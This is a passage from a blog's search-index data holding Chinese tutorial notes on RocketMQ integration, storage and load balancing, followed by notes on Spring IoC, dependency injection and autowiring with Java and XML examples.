&#125;&#125;\n\n实现消息消费者的步骤大致有以下两点：\n\n添加**@RocketMQMessageListener**注解，并且指定订阅的Topic和消费组等属性。\n实现RocketMQListener接口，泛型就是消息的类型，接着实现其中的onMessage监听方法。代码中我们使用的MessageExt是Message的子类，对其进行了扩展。\n\n关于事务消息的具体案例可以参考分布式事务解决方案一文 。\n扩展SpringBoot RocketMQ还提供了扩展功能，它允许我们对RocketMQTemplate进行扩展：\n@ExtRocketMQTemplateConfiguration()public class ExtRocketMQTemplate extends RocketMQTemplate &#123;    &#125;\n\n在注解@ExtRocketMQTemplateConfiguration中可以定制非常多的属性：\npublic @interface ExtRocketMQTemplateConfiguration &#123;    /**     * The component name of the Producer configuration.     */    String value() default &quot;&quot;;    /**     * The property of &quot;name-server&quot;.     */    String nameServer() default &quot;$&#123;rocketmq.name-server:&#125;&quot;;    /**     * Name of producer.     */    String group() default &quot;$&#123;rocketmq.producer.group:&#125;&quot;;    /**     * Millis of send message timeout.     */    int sendMessageTimeout() default -1;    /**     * Compress message body threshold, namely, message body larger than 4k will be compressed on default.     */    int compressMessageBodyThreshold() default -1;    /**     * Maximum number of retry to perform internally before claiming sending failure in synchronous mode.     * This may potentially cause message duplication which is up to application developers to resolve.     */    int retryTimesWhenSendFailed() default -1;    /**     * &lt;p&gt; Maximum number of retry to perform internally before claiming sending failure in asynchronous mode. &lt;/p&gt;     * This may potentially cause message duplication which is up to application developers to resolve.     */    int retryTimesWhenSendAsyncFailed() default -1;    /**     * Indicate whether to retry another broker on sending failure internally.     */    boolean retryNextServer() default false;    /**     * Maximum allowed message size in bytes.     */    int maxMessageSize() default -1;    /**     * The property of &quot;access-key&quot;.     */    String accessKey() default &quot;$&#123;rocketmq.producer.accessKey:&#125;&quot;;    /**     * The property of &quot;secret-key&quot;.     */    String secretKey() default &quot;$&#123;rocketmq.producer.secretKey:&#125;&quot;;    /**     * Switch flag instance for message trace.     */    boolean enableMsgTrace() default true;    /**     * The name value of message trace topic.If you don&#x27;t config,you can use the default trace topic name.     */    String customizedTraceTopic() default &quot;$&#123;rocketmq.producer.customized-trace-topic:&#125;&quot;;\n\nSpringCloudStream整合RocketMQSpringCloudStream是Spring社区提供的一个统一的消息驱动框架，目的是想要以一个统一的编程模型来对接所有的MQ消息中间件产品。SpringCloudStream将MQ高度抽象，分为如下两个部分：\n\nBinder：具体的MQ产品。\nBindings：应用与MQ产品直接的消息通道。\n\n看上去确实很抽象，我们通过具体例子来看看SpringCloudStream如何集成RocketMQ。\n导入依赖&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;    &lt;version&gt;2.3.3.RELEASE&lt;/version&gt;&lt;/dependency&gt;&lt;!--SpringCloudStream的RocketMQ依赖，由于版本原因，需要排除其中的RocketMQ客户端和ACL--&gt;&lt;dependency&gt;    &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;    &lt;artifactId&gt;spring-cloud-starter-stream-rocketmq&lt;/artifactId&gt;    &lt;version&gt;2.2.3.RELEASE&lt;/version&gt;    &lt;exclusions&gt;        &lt;exclusion&gt;            &lt;groupId&gt;org.apache.rocketmq&lt;/groupId&gt;            &lt;artifactId&gt;rocketmq-client&lt;/artifactId&gt;        &lt;/exclusion&gt;        &lt;exclusion&gt;            &lt;groupId&gt;org.apache.rocketmq&lt;/groupId&gt;            &lt;artifactId&gt;rocketmq-acl&lt;/artifactId&gt;        &lt;/exclusion&gt;    &lt;/exclusions&gt;&lt;/dependency&gt;&lt;!--RocketMQ客户端--&gt;&lt;dependency&gt;    &lt;groupId&gt;org.apache.rocketmq&lt;/groupId&gt;    &lt;artifactId&gt;rocketmq-client&lt;/artifactId&gt;    &lt;version&gt;4.4.0&lt;/version&gt;&lt;/dependency&gt;&lt;!--ACL--&gt;&lt;dependency&gt;    &lt;groupId&gt;org.apache.rocketmq&lt;/groupId&gt;    &lt;artifactId&gt;rocketmq-acl&lt;/artifactId&gt;    &lt;version&gt;4.4.0&lt;/version&gt;&lt;/dependency&gt;\n\n启动类// 添加特有的@EnableBinding注解@EnableBinding(&#123;Source.class, Sink.class&#125;)@SpringBootApplicationpublic class ScRocketMQApplication &#123;    public static void main(String[] args) &#123;        SpringApplication.run(ScRocketMQApplication.class,args);    &#125;&#125;\n\n配置文件# SpringCloudStream通用的配置以spring.cloud.stream开头# 消息消费者，input对应Sink接口spring.cloud.stream.bindings.input.destination=TestTopicspring.cloud.stream.bindings.input.group=scGroup# 消息发送者，output对应Source接口spring.cloud.stream.bindings.output.destination=TestTopic# RocketMQ的个性化配置以spring.cloud.stream.rocketmq开头spring.cloud.stream.rocketmq.binder.name-server=192.168.74.88:9876;192.168.74.77:9876;\n\n生产者与消费者\n生产者\n\n@Componentpublic class ScProducer &#123;    // 注入Source    @Resource    private Source source;    public void sendMessage(String msg)&#123;        // 构建消息        Message&lt;String&gt; message = MessageBuilder                .withPayload(msg)                .setHeader(MessageConst.PROPERTY_TAGS,&quot;tag&quot;)                .build();        // 通过如下方式发送消息        this.source.output().send(message);    &#125;&#125;\n\n\n消费者\n\n@Componentpublic class ScConsumer &#123;    // 通过@StreamListener注解标记消费者    @StreamListener(Sink.INPUT)    public void onMessage(String messsage) &#123;        System.out.println(&quot;received message:&quot; + messsage + &quot; from binding:&quot; +                Sink.INPUT);    &#125;&#125;\n\n小结可以看到，使用起来非常非常简单，SpringCloudStream的特点如下：\n\n这是一套几乎通用的消息中间件编程框架，例如从对接RocketMQ换到对接Kafka，业务代码几乎不需要动，只需要更换pom依赖并且修改配置文件就行了。但是，由于各个MQ产品都有自己的业务模型，差距非常大，所以使用使用SpringCloudStream时要注意业务模型转换。并且在实际使用中，要非常注意各个MQ的个性化配置属性。例如RocketMQ的个性化属性都是以spring.cloud.stream.rocketmq开头，只有通过这些属性才能用上RocketMQ的延迟消息、排序消息、事务消息等个性化功能。\nSpringCloudStream是Spring社区提供的一套统一框架，但是官方目前只封装了kafka、kafka Stream、RabbitMQ的具体依赖。而RocketMQ的依赖是交由厂商自己维护的，也就是由阿里巴巴自己来维护。这个维护力度显然是有不小差距的。spring-cloud-starter-stream-rocketmq目前最新的2.2.3.RELEASE版本中包含的rocketmq-client版本还是4.4.0。另一方面，SpringCloudStream中关于RocketMQ的个性化配置几乎很难找到完整的文档。\n总之，对于RocketMQ来说，SpringCloudStream目前来说还并不是一个非常好的集成方案。这方面跟kafka和Rabbit还没法比。所以使用时要慎重。\n\nRocketMQ进阶消息存储分布式队列因为有高可靠性的要求，所以数据要进行持久化存储，如下图所示：\n\n\n消息生成者发送消息\nMQ收到消息，将消息进行持久化，在存储中新增一条记录\n返回ACK给生产者\nMQ push 消息给对应的消费者，然后等待消费者返回ACK\n如果消息消费者在指定时间内成功返回ack，那么MQ认为消息消费成功，在存储中删除消息，即执行第6步；如果MQ在指定时间内没有收到ACK，则认为消息消费失败，会尝试重新push消息，重复执行4、5、6步骤\nMQ删除消息\n\n存储介质\n关系型数据库DB\n\nApache下开源的另外一款MQ—ActiveMQ（默认采用的KahaDB做消息存储）可选用JDBC的方式来做消息持久化，通过简单的xml配置信息即可实现JDBC消息存储。由于，普通关系型数据库（如Mysql）在单表数据量达到千万级别的情况下，其IO读写性能往往会出现瓶颈。在可靠性方面，该种方案非常依赖DB，如果一旦DB出现故障，则MQ的消息就无法落盘存储会导致线上故障。\n\n文件系统\n\n目前业界较为常用的几款产品（RocketMQ&#x2F;Kafka&#x2F;RabbitMQ）均采用的是消息刷盘至所部署虚拟机&#x2F;物理机的文件系统来做持久化（刷盘一般可以分为异步刷盘和同步刷盘两种模式）。消息刷盘为消息存储提供了一种高效率、高可靠性和高性能的数据持久化方式。除非部署MQ机器本身或是本地磁盘挂了，否则一般是不会出现无法持久化的故障问题。\n\n性能对比\n\n文件系统 &gt; 关系型数据库DB\n消息的存储和发送\n消息存储\n\n磁盘如果使用得当，磁盘的速度完全可以匹配上网络的数据传输速度。目前的高性能磁盘，顺序写速度可以达到600MB&#x2F;s， 超过了一般网卡的传输速度。但是磁盘随机写的速度只有大概100KB&#x2F;s，和顺序写的性能相差6000倍！因为有如此巨大的速度差别，好的消息队列系统会比普通的消息队列系统速度快多个数量级。RocketMQ的消息用顺序写，保证了消息存储的速度。\n\n消息发送\n\nLinux操作系统分为【用户态】和【内核态】，文件操作、网络操作需要涉及这两种形态的切换，免不了进行数据复制。一台服务器把本机磁盘文件的内容发送到客户端，一般分为两个步骤：\n\nread：读取本地文件内容。\nwrite：将读取的内容通过网络发送出去。\n\n这两个看似简单的操作，实际进行了4次数据复制，分别是：\n\n从磁盘复制数据到内核态内存。\n从内核态内存复制到用户态内存。\n然后从用户态内存复制到网络驱动的内核态内存。\n最后是从网络驱动的内核态内存复制到网卡中进行传输。\n\n\n通过使用mmap(内存映射)的方式，可以省去向用户态的内存复制，提高速度。这种机制在Java中是通过MappedByteBuffer实现的。RocketMQ充分利用了该特性，也就是所谓的零拷贝技术，提高消息存盘和网络发送的速度。\n\n这里需要注意的是，采用MappedByteBuffer这种内存映射的方式有几个限制，其中之一是一次只能映射1.5~2G 的文件至用户态的虚拟内存，这也是为何RocketMQ默认设置单个CommitLog日志数据文件为1G的原因了。\n关于零拷贝，JAVA的NIO中提供了两种实现方式，mmap和sendfifile，其中mmap适合比较小的文件，而sendfifile适合传递比较大的文件。\n\n消息存储结构RocketMQ消息的存储是由Consumer Queue和CommitLog配合完成的，消息真正的物理存储文件是CommitLog，Consumer Queue是消息的逻辑队列，类似数据库的索引文件，存储的是指向物理存储的地址，而不是具体的消息内容。每个Topic下的每个Message Queue都有一个对应的Consumer Queue文件。\n\n\nCommitLog：存储消息的元数据。生产者发送的所有消息都会顺序存入到CommitLog文件当中。CommitLog由多个文件组成，每个文件固定大小1G。以第一条消息的偏移量为文件名。\nConsumerQueue：存储消息在CommitLog的索引，而不存储消息具体内容。一个Message Queue对应一个文件，记录当前Message Queue被哪些消费者组消费到了哪一条CommitLog。\nIndexFile：为了消息查询提供了一种通过key或时间区间来查询消息的方法，这种通过IndexFile来查找消息的方法不影响发送与消费消息的主流程。\n\n\n还记得我们在搭建集群时都特意指定的文件存储路径吗？现在可以上去看看这些文件都是什么样子。还有哪些落盘的文件？另外还有几个文件可以了解下：\n\nabort：这个文件是RocketMQ用来判断程序是否正常关闭的一个标识文件。正常情况下，会在启动时创建，而关闭服务时删除。但是如果遇到一些服务器宕机，或者kill这样一些非正常关闭服务的情况，这个abort文件就不会删除，因此RocketMQ就可以判断上一次服务是非正常关闭的，后续就会做一些数据恢复的操作。\ncheckpoint：数据存盘检查点。\nconfifig&#x2F;*.json：这些文件是将RocketMQ的一些关键配置信息进行存盘保存。例如Topic配置、消费者组配置、消费者组消息偏移量Offffset 等等一些信息。\n\n\n刷盘机制RocketMQ的消息是存储到磁盘上的，这样既能保证断电后恢复， 又可以让存储的消息量超出内存的限制。RocketMQ为了提高性能，会尽可能地保证磁盘的顺序写。消息在通过Producer写入RocketMQ的时候，有两种写磁盘方式，同步刷盘和异步刷盘。\n\n\n同步刷盘\n\n在返回写成功状态时，消息已经被写入磁盘。具体流程是，消息写入内存的后，立刻通知刷盘线程刷盘， 然后等待刷盘完成，刷盘线程执行完成后唤醒等待的线程，返回消息写成功的状态。\n\n异步刷盘\n\n在返回写成功状态时，消息可能只是被写入了内存，写操作的返回快，吞吐量大；当内存里的消息量积累到一定程度时，统一触发写磁盘动作，快速写入。\n\n配置\n\n同步刷盘还是异步刷盘，都是通过Broker配置文件里的flushDiskType 参数设置的，这个参数被配置成SYNC_FLUSH、ASYNC_FLUSH中的 一个。\n高可用性机制\nRocketMQ分布式集群是通过Master和Slave的配合达到高可用性的。\nMaster和Slave的区别：在Broker的配置文件中，参数 brokerId的值为0表明这个Broker是Master，大于0表明这个Broker是 Slave，同时brokerRole参数也会说明这个Broker是Master还是Slave。\nMaster角色的Broker支持读和写，Slave角色的Broker仅支持读，也就是 Producer只能和Master角色的Broker连接写入消息；Consumer可以连接 Master角色的Broker，也可以连接Slave角色的Broker来读取消息。\n消息消费高可用RocketMQ从如下两个方面可以保证消费高可用：\n\nRocketMQ中，消费者同样会把同一类Consumer组成一个集合，叫做消费者组，这类Consumer通常消费同一类消息且消费逻辑一致。消费者组使得在消息消费方面，实现负载均衡和容错的目标变得非常容易。要注意的是，消费者组的消费者实例必须订阅完全相同的Topic。\n另外在RocketMQ集群中，Consumer的配置文件里并不需要设置是从Master读还是从Slave 读，当Master不可用或者繁忙的时候，Consumer会被自动切换到从Slave读。有了自动切换Consumer这种机制，当一个Master角色的机器出现故障后，Consumer仍然可以从Slave读取消息，不影响Consumer程序。\n\n消息发送高可用RocketMQ从如下两个方面可以保证发送高可用：\n\n和消费者一样，RocketMQ中会把同一类Producer组成一个集合，叫做生产者组，这类Producer发送同一类消息且发送逻辑一致。如果发送的是事务消息且原始生产者在发送之后崩溃，则Broker服务器会联系同一生产者组的其他生产者实例以提交或回溯消费。\n在创建Topic的时候，把Topic的多个Message Queue创建在多个Broker组上（相同Broker名称，不同 brokerId的机器组成一个Broker组），这样当一个Broker组的Master不可用后，其他组的Master仍然可用，Producer仍然可以发送消息。 (Topic默认每个Master上4个队列)\n\n\n消息主从复制如果一个Broker组有Master和Slave，消息需要从Master复制到Slave 上，有同步和异步两种复制方式。\n\n同步复制\n\n同步复制方式是等Master和Slave均写 成功后才反馈给客户端写成功状态；\n在同步复制方式下，如果Master出故障， Slave上有全部的备份数据，容易恢复，但是同步复制会增大数据写入 延迟，降低系统吞吐量。\n\n异步复制\n\n异步复制方式是只要Master写成功 即可反馈给客户端写成功状态。\n在异步复制方式下，系统拥有较低的延迟和较高的吞吐量，但是如果Master出了故障，有些数据因为没有被写 入Slave，有可能会丢失；\n\n配置\n\n同步复制和异步复制是通过Broker配置文件里的brokerRole参数进行设置的，这个参数可以被设置成ASYNC_MASTER、 SYNC_MASTER、SLAVE三个值中的一个。\n\n总结\n\n\n实际应用中要结合业务场景，合理设置刷盘方式和主从复制方式， 尤其是SYNC_FLUSH方式，由于频繁地触发磁盘写动作，会明显降低性能。通常情况下，应该将刷盘方式配置成ASYNC_FLUSH，主从之间的复制方式配置成SYNC_MASTER，即采用异步刷盘、主从同步复制的方式。这样即使有一台机器出故障，仍然能保证数据不丢，是个不错的选择。\n负载均衡Producer负载均衡Producer端，每个实例在发消息的时候，默认会轮询所有的message queue发送，以达到让消息平均落在不同的queue上。而由于queue可以散落在不同的broker，所以消息就发送到不同的broker下，如下图：\n\n图中箭头线条上的标号代表顺序，发布方会把第一条消息发送至 Queue 0，然后第二条消息发送至 Queue 1，以此类推。\nConsumer负载均衡\n集群模式\n\n在集群消费模式下，每条消息只需要投递到订阅这个topic的Consumer Group下的一个实例即可。RocketMQ采用主动拉取的方式拉取并消费消息，在拉取的时候需要明确指定拉取哪一条message queue。\n而每当实例的数量有变更，都会触发一次所有实例的负载均衡，这时候会按照queue的数量和实例的数量平均分配queue给每个实例。默认的分配算法是AllocateMessageQueueAveragely，如下图：\n\n还有另外一种平均的算法是AllocateMessageQueueAveragelyByCircle，也是平均分摊每一条queue，只是以环状轮流分queue的形式，如下图：\n\n\n另外还有两种比较独特的分配方式：\n\nAllocateMachineRoomNearby： 将同机房的Consumer和Broker优先分配在一起。这个策略可以通过一个machineRoomResolver对象来定制Consumer和Broker的机房解析规则。然后还需要引入另外一个分配策略来对同机房的Broker和Consumer进行分配。一般也就用简单的平均分配策略或者轮询分配策略。\nAllocateMessageQueueByMachineRoom：按逻辑机房的概念进行分配。又是对BrokerName和ConsumerIdc有定制化的配置。\n\n\n需要注意的是，集群模式下对于同一个消费者组来说，queue都是只允许分配一个实例，这是由于如果多个实例同时消费一个queue的消息，由于拉取哪些消息是consumer主动控制的，那样会导致同一个消息在不同的实例下被消费多次，所以算法上都是一个queue只分给一个consumer实例，一个consumer实例可以允许同时分到不同的queue。\n通过增加consumer实例去分摊queue的消费，可以起到水平扩展的消费能力的作用。而有实例下线的时候，会重新触发负载均衡，这时候原来分配到的queue将分配到其他实例上继续消费。\n但是如果consumer实例的数量比message queue的总数量还多的话，多出来的consumer实例将无法分到queue，也就无法消费到消息，也就无法起到分摊负载的作用了。所以需要控制让queue的总数量大于等于consumer的数量。\n\n广播模式\n\n由于广播模式下要求一条消息需要投递到一个消费组下面所有的消费者实例，所以也就没有消息被分摊消费的说法。\n在实现上，其中一个不同就是在consumer分配queue的时候，所有consumer都分到所有的queue。\n\n","tags":["2021"]},{"title":"Spring","url":"/2021/03/24/2021/Spring/","content":"\n\nSpring官网 : http://spring.io/\n官方下载地址 : https://repo.spring.io/libs-release-local/org/springframework/spring/\nGitHub : https://github.com/spring-projects\n\n优点\n\n1、Spring是一个开源免费的框架 , 容器  .\n2、Spring是一个轻量级的框架 , 非侵入式的 .\n3、控制反转 IoC  , 面向切面 Aop\n4、对事物的支持 , 对框架的支持\nSpring是一个轻量级的控制反转(IoC)和面向切面(AOP)的容器（框架）。\nIOC控制反转IoC(Inversion of Control)，是一种设计思想，DI(依赖注入)是实现IoC的一种方法，也有人认为DI只是IoC的另一种说法。没有IoC的程序中 , 我们使用面向对象编程 , 对象的创建与对象间的依赖关系完全硬编码在程序中，对象的创建由程序自己控制，控制反转后将对象的创建转移给第三方，个人认为所谓控制反转就是：获得依赖对象的方式反转了。\n例如：\npublic static void main(String[] args) &#123;    UserServiceImpl userService = new UserServiceImpl(); \t//通过set方法注入对应的类 可以方便类修改时service代码不用修改    userService.setUserdao1(new UserdaoImpl2());    userService.getUser();&#125;\n\n某种意义上是从set方法中开始注入，使得程序解耦合\n\nIoC是Spring框架的核心内容，使用多种方式完美的实现了IoC，可以使用XML配置，也可以使用注解，新版本的Spring也可以零配置实现IoC。\nSpring容器在初始化时先读取配置文件，根据配置文件或元数据创建与组织对象存入容器中，程序使用时再从Ioc容器中取出需要的对象。\n举个例子：\n首先写好xml文件\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans       http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;    &lt;!--bean就是java对象 , 由Spring创建和管理--&gt;    &lt;bean id=&quot;hello&quot; class=&quot;com.liduoan.service.hello&quot;&gt;        &lt;property name=&quot;name&quot; value=&quot;liduoan&quot;&gt;&lt;/property&gt;    &lt;/bean&gt;&lt;/beans&gt;\n\n注意文件中bean的配置\n测试一下\n    public static void main(String[] args) &#123;        //解析beans.xml文件 , 生成管理相应的Bean对象        ApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;);        //getBean : 参数即为spring配置文件中bean的id .        hello Hello = (hello) context.getBean(&quot;hello&quot;);        Hello.show();    &#125;&#125;\n\n由控制文件进行类的创建和变化，使得需求改变的时候，只需要改一下配置文件就可以了\nIOC创建对象方式通过无参构造方法来创建\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;      xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;      xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans       http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;\t&lt;!--用的Set注入--&gt;   &lt;bean id=&quot;user&quot; class=&quot;com.kuang.pojo.User&quot;&gt;       &lt;property name=&quot;name&quot; value=&quot;kuangshen&quot;/&gt;   &lt;/bean&gt;&lt;/beans&gt;\n\n通过有参构造方法来创建\nbeans.xml 有三种方式编写\n&lt;!-- 第一种根据index参数下标设置 --&gt;&lt;bean id=&quot;userT&quot; class=&quot;com.kuang.pojo.UserT&quot;&gt;   &lt;!-- index指构造方法 , 下标从0开始 --&gt;   &lt;constructor-arg index=&quot;0&quot; value=&quot;kuangshen2&quot;/&gt;&lt;/bean&gt;&lt;!-- 第二种根据参数名字设置 --&gt;&lt;bean id=&quot;userT&quot; class=&quot;com.kuang.pojo.UserT&quot;&gt;   &lt;!-- name指参数名 --&gt;   &lt;constructor-arg name=&quot;name&quot; value=&quot;kuangshen2&quot;/&gt;&lt;/bean&gt;&lt;!-- 第三种根据参数类型设置 --&gt;&lt;bean id=&quot;userT&quot; class=&quot;com.kuang.pojo.UserT&quot;&gt;   &lt;constructor-arg type=&quot;java.lang.String&quot; value=&quot;kuangshen2&quot;/&gt;&lt;/bean&gt;\n\nSpring配置\n别名\n\nalias 设置别名 , 为bean设置别名 , 可以设置多个别名\n&lt;!--设置别名：在获取Bean的时候可以使用别名获取--&gt;&lt;alias name=&quot;userT&quot; alias=&quot;userNew&quot;/&gt;\n\n\nBean的配置\n\n&lt;!--bean就是java对象,由Spring创建和管理--&gt;&lt;!--   id 是bean的标识符,要唯一,如果没有配置id,name就是默认标识符   如果配置id,又配置了name,那么name是别名   name可以设置多个别名,可以用逗号,分号,空格隔开   如果不配置id和name,可以根据applicationContext.getBean(.class)获取对象;class是bean的全限定名=包名+类名--&gt;&lt;bean id=&quot;hello&quot; name=&quot;hello2 h2,h3;h4&quot; class=&quot;com.kuang.pojo.Hello&quot;&gt;   &lt;property name=&quot;name&quot; value=&quot;Spring&quot;/&gt;&lt;/bean&gt;\n\n\nimport\n\n团队的合作通过import来实现 .\n&lt;import resource=&quot;&#123;path&#125;/beans.xml&quot;/&gt;\n\n依赖注入\n概念\n\n\n依赖注入（Dependency Injection,DI）。\n依赖 : 指Bean对象的创建依赖于容器 . Bean对象的依赖资源 .\n注入 : 指Bean对象所依赖的资源 , 由容器来设置和装配\n\n大体分为 构造器注入  Set注入 其他方式注入\nBean注入 【属于Set注入注意点：这里的值是一个引用，ref\n&lt;bean id=&quot;addr&quot; class=&quot;com.kuang.pojo.Address&quot;&gt;    &lt;property name=&quot;address&quot; value=&quot;重庆&quot;/&gt;&lt;/bean&gt;&lt;bean id=&quot;student&quot; class=&quot;com.kuang.pojo.Student&quot;&gt;    &lt;property name=&quot;name&quot; value=&quot;小明&quot;/&gt;    &lt;property name=&quot;address&quot; ref=&quot;addr&quot;/&gt;&lt;/bean&gt;\n\n3、数组注入\n&lt;bean id=&quot;student&quot; class=&quot;com.kuang.pojo.Student&quot;&gt;    &lt;property name=&quot;name&quot; value=&quot;小明&quot;/&gt;    &lt;property name=&quot;address&quot; ref=&quot;addr&quot;/&gt;    &lt;property name=&quot;books&quot;&gt;        &lt;array&gt;            &lt;value&gt;西游记&lt;/value&gt;            &lt;value&gt;红楼梦&lt;/value&gt;            &lt;value&gt;水浒传&lt;/value&gt;        &lt;/array&gt;    &lt;/property&gt;&lt;/bean&gt;\n\n4、List注入\n&lt;property name=&quot;hobbys&quot;&gt;    &lt;list&gt;        &lt;value&gt;听歌&lt;/value&gt;        &lt;value&gt;看电影&lt;/value&gt;        &lt;value&gt;爬山&lt;/value&gt;    &lt;/list&gt;&lt;/property&gt;\n\n5、Map注入\n&lt;property name=&quot;card&quot;&gt;    &lt;map&gt;        &lt;entry key=&quot;中国邮政&quot; value=&quot;456456456465456&quot;/&gt;        &lt;entry key=&quot;建设&quot; value=&quot;1456682255511&quot;/&gt;    &lt;/map&gt;&lt;/property&gt;\n\n6、set注入\n&lt;property name=&quot;games&quot;&gt;    &lt;set&gt;        &lt;value&gt;LOL&lt;/value&gt;        &lt;value&gt;BOB&lt;/value&gt;        &lt;value&gt;COC&lt;/value&gt;    &lt;/set&gt;&lt;/property&gt;\n\n7、Null注入\n&lt;property name=&quot;wife&quot;&gt;&lt;null/&gt;&lt;/property&gt;\n\n8、Properties注入\n&lt;property name=&quot;info&quot;&gt;    &lt;props&gt;        &lt;prop key=&quot;学号&quot;&gt;20190604&lt;/prop&gt;        &lt;prop key=&quot;性别&quot;&gt;男&lt;/prop&gt;        &lt;prop key=&quot;姓名&quot;&gt;小明&lt;/prop&gt;    &lt;/props&gt;&lt;/property&gt;\n\np命名和c命名注入User.java ：【注意：这里没有有参构造器！】\npublic class User &#123;    private String name;    private int age;    public void setName(String name) &#123;        this.name = name;   &#125;    public void setAge(int age) &#123;        this.age = age;   &#125;    @Override    public String toString() &#123;        return &quot;User&#123;&quot; +                &quot;name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; +                &quot;, age=&quot; + age +                &#x27;&#125;&#x27;;   &#125;&#125;\n\n1、P命名空间注入 : 需要在头文件中加入约束文件 【类似Set注入\n导入约束 : xmlns:p=&quot;http://www.springframework.org/schema/p&quot;&lt;!--P(属性: properties)命名空间 , 属性依然要设置set方法--&gt;&lt;bean id=&quot;user&quot; class=&quot;com.kuang.pojo.User&quot; p:name=&quot;狂神&quot; p:age=&quot;18&quot;/&gt;\n\n2、c 命名空间注入 : 需要在头文件中加入约束文件\n导入约束 : xmlns:c=&quot;http://www.springframework.org/schema/c&quot;&lt;!--C(构造: Constructor)命名空间 , 属性依然要设置set方法--&gt;&lt;bean id=&quot;user&quot; class=&quot;com.kuang.pojo.User&quot; c:name=&quot;狂神&quot; c:age=&quot;18&quot;/&gt;\n\n发现问题：爆红了，刚才我们没有写有参构造！\n解决：把有参构造器加上，这里也能知道，c 就是所谓的构造器注入！\n测试代码：\n@Testpublic void test02()&#123;    ApplicationContext context = newClassPathXmlApplicationContext(&quot;applicationContext.xml&quot;);    User user = (User) context.getBean(&quot;user&quot;);    System.out.println(user);&#125;\n\n自动装配\n自动装配说明\n\n\n自动装配是使用spring满足bean依赖的一种方法\nspring会在应用上下文中为某个bean寻找其依赖的bean。\n\nSpring中bean有三种装配机制，分别是：\n\n在xml中显式配置；\n在java中显式配置；\n隐式的bean发现机制和自动装配。\n\n这里我们主要讲第三种：自动化的装配bean。\nSpring的自动装配需要从两个角度来实现，或者说是两个操作：\n\n组件扫描(component scanning)：spring会自动发现应用上下文中所创建的bean；\n自动装配(autowiring)：spring自动满足bean之间的依赖，也就是我们说的IoC&#x2F;DI；\n\n组件扫描和自动装配组合发挥巨大威力，使得显示的配置降低到最少。\n推荐不使用自动装配xml配置 , 而使用注解 .\n\n测试环境搭建\n\n1、新建一个项目\n2、新建两个实体类，Cat  Dog  都有一个叫的方法\npublic class Cat &#123;   public void shout() &#123;       System.out.println(&quot;miao~&quot;);  &#125;&#125;public class Dog &#123;   public void shout() &#123;       System.out.println(&quot;wang~&quot;);  &#125;&#125;\n\n3、新建一个用户类 User\npublic class User &#123;   private Cat cat;   private Dog dog;   private String str;&#125;\n\n4、编写Spring配置文件\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;      xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;      xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans       http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;   &lt;bean id=&quot;dog&quot; class=&quot;com.kuang.pojo.Dog&quot;/&gt;   &lt;bean id=&quot;cat&quot; class=&quot;com.kuang.pojo.Cat&quot;/&gt;   &lt;bean id=&quot;user&quot; class=&quot;com.kuang.pojo.User&quot;&gt;       &lt;property name=&quot;cat&quot; ref=&quot;cat&quot;/&gt;       &lt;property name=&quot;dog&quot; ref=&quot;dog&quot;/&gt;       &lt;property name=&quot;str&quot; value=&quot;qinjiang&quot;/&gt;   &lt;/bean&gt;&lt;/beans&gt;\n\n5、测试\npublic class MyTest &#123;   @Test   public void testMethodAutowire() &#123;       ApplicationContext context = newClassPathXmlApplicationContext(&quot;beans.xml&quot;);       User user = (User) context.getBean(&quot;user&quot;);       user.getCat().shout();       user.getDog().shout();  &#125;&#125;\n\n结果正常输出，环境OK\nbyNameautowire byName (按名称自动装配)\n由于在手动配置xml过程中，常常发生字母缺漏和大小写等错误，而无法对其进行检查，使得开发效率降低。\n采用自动装配将避免这些错误，并且使配置简单化。\n测试：\n1、修改bean配置，增加一个属性  autowire&#x3D;”byName”\n&lt;bean id=&quot;user&quot; class=&quot;com.kuang.pojo.User&quot; autowire=&quot;byName&quot;&gt;   &lt;property name=&quot;str&quot; value=&quot;qinjiang&quot;/&gt;&lt;/bean&gt;\n\n2、再次测试，结果依旧成功输出！\n3、我们将 cat 的bean id修改为 catXXX\n4、再次测试， 执行时报空指针java.lang.NullPointerException。因为按byName规则找不对应set方法，真正的setCat就没执行，对象就没有初始化，所以调用时就会报空指针错误。\n小结：当一个bean节点带有 autowire byName的属性时。\n\n将查找其类中所有的set方法名，例如setCat，获得将set去掉并且首字母小写的字符串，即cat。\n\n去spring容器中寻找是否有此字符串名称id的对象。\n\n如果有，就取出注入；如果没有，就报空指针异常。\n\n\nbyTypeautowire byType (按类型自动装配)\n使用autowire byType首先需要保证：同一类型的对象，在spring容器中唯一。如果不唯一，会报不唯一的异常。\nNoUniqueBeanDefinitionException\n\n测试：\n1、将user的bean配置修改一下 ： autowire&#x3D;”byType”\n2、测试，正常输出\n3、在注册一个cat 的bean对象！\n&lt;bean id=&quot;dog&quot; class=&quot;com.kuang.pojo.Dog&quot;/&gt;&lt;bean id=&quot;cat&quot; class=&quot;com.kuang.pojo.Cat&quot;/&gt;&lt;bean id=&quot;cat2&quot; class=&quot;com.kuang.pojo.Cat&quot;/&gt;&lt;bean id=&quot;user&quot; class=&quot;com.kuang.pojo.User&quot; autowire=&quot;byType&quot;&gt;   &lt;property name=&quot;str&quot; 